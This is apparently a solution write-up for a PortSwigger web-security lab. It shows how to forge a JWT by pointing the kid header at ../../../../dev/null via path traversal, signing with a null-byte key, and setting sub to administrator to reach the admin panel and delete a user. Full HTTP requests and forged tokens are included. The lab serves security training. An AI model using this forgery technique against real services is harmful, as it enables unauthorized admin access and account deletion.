## JWT authentication bypass via kid header path traversal

This lab uses a JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the kid parameter in JWT header to fetch the relevant key from its filesystem.

To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

Tip :

We recommend familiarizing yourself with how to work with JWTs in Burp Suite before attempting this lab.

## Notes

- JWT in the session cookie.
- `/admin`
- `/admin/delete?username=carlos`
- Burp JWT Editor extension.
- Path traversal in `kid`.
- Null-byte key workaround.

## Resume

1. Log in using `wiener:peter`.
2. Open the post-login `GET /my-account` request in Burp Repeater.
3. Confirm that `/admin` is only accessible as `administrator`.
4. Generate a symmetric key in JWT Editor.
5. Replace the generated `k` value with `AA==`.
6. Change `kid` to a path traversal targeting `/dev/null`.
7. Change `sub` to `administrator`.
8. Sign the token with the generated symmetric key.
9. Access the admin panel and delete `carlos`.

## Solve

Log in using your own credentials.

In Burp, open the post-login `GET /my-account` request and inspect the session cookie. The JWT looked like this:

```http
GET /my-account?id=wiener HTTP/2
Host: 0aa4001003319937802c7b1000e7007b.web-security-academy.net
Cookie: session=eyJraWQiOiIzMmQxZjBkNC1jNmViLTQ1YzItYWU1ZS1iODI4YzU5ZjhjNTgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3OTk2MjI4MSwic3ViIjoid2llbmVyIn0.InIN2paY-DH5PEZgv4QF7RjgGA_CqBauGOpPKMbgVDg
```

In Burp Repeater, change the path to `/admin` and send the request. The admin panel is only accessible when logged in as the `administrator` user.

Go to the **JWT Editor Keys** tab in Burp's main tab bar.

Click **New Symmetric Key**.

In the dialog, click **Generate** to generate a new key in JWK format. The JWT Editor does not allow signing with an empty string, so replace the generated `k` value with the Base64-encoded null byte:

```text
AA==
```

Save the key.

Go back to the `GET /admin` request in Burp Repeater and switch to the extension-generated **JSON Web Token** message editor tab.

Modify the JWT as follows:

Header:

```json
{
    "kid": "../../../../../../../dev/null",
    "alg": "HS256"
}
```

Payload:

```json
{
    "iss": "portswigger",
    "exp": 1779962281,
    "sub": "administrator"
}
```

At the bottom of the tab, click **Sign**, then select the symmetric key that was generated in the previous section.

Make sure that **Don't modify header** is selected, then click **OK**. The modified token is now signed using a null byte as the secret key.

The forged admin request looked like this:

```http
GET /admin HTTP/2
Host: 0aa4001003319937802c7b1000e7007b.web-security-academy.net
Cookie: session=eyJraWQiOiIuLi8uLi8uLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3OTk2MjI4MSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.FhrHioUX7JcrZbHb31dFYWgHV8KHEj0R5sYKUirlw_0
```

Send the request. The admin panel should now be accessible.

The response contains the following HTML:

```html
<section>
    <h1>Users</h1>
    <div>
        <span>wiener - </span>
        <a href="/admin/delete?username=wiener">Delete</a>
    </div>
    <div>
        <span>carlos - </span>
        <a href="/admin/delete?username=carlos">Delete</a>
    </div>
</section>
```

Finally, send this request to delete `carlos`:

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0aa4001003319937802c7b1000e7007b.web-security-academy.net
Cookie: session=eyJraWQiOiIuLi8uLi8uLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3OTk2MjI4MSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.FhrHioUX7JcrZbHb31dFYWgHV8KHEj0R5sYKUirlw_0
```

Send that request to solve the lab.